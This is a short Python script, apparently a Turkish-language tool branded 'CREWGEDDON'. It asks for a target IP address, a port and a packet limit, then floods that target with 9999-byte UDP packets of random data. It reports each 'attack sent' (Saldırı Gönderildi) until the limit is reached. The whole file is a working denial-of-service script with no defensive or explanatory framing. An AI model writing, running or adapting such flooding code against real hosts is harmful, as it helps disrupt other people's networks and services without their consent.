from colorama import Fore
import time
import socket
import random
import subprocess

def ddosSystem():
      ip = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}IP Adresi: ")
      port = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Port: "))
      limit = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Limit (Max: 99999): "))
      
      if limit > 99999:
            print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Lütfen limiti geçmeyin, limit 99999")
            return limit
      elif not ip:
            print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}IP Boş bırakılamaz.")
            return ip
      elif not port:
            print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}PORT Boş bırakılamaz.")
            return port
      
      crewsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      counter = 0
      crewrandom = random.randbytes(9999)
      print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Saldırı başlatılıyor, lütfen bekleyin.")
      time.sleep(2)
      while True:
            crewsock.sendto(crewrandom, (ip, port))
            time.sleep(0.3)
            print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Saldırı Gönderildi, ({ip}:{port} - {limit}) Yüzde: %{counter}")
            counter = counter + 1
            if counter >= limit:
                  print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Saldırı limitiniz doldu.")
                  break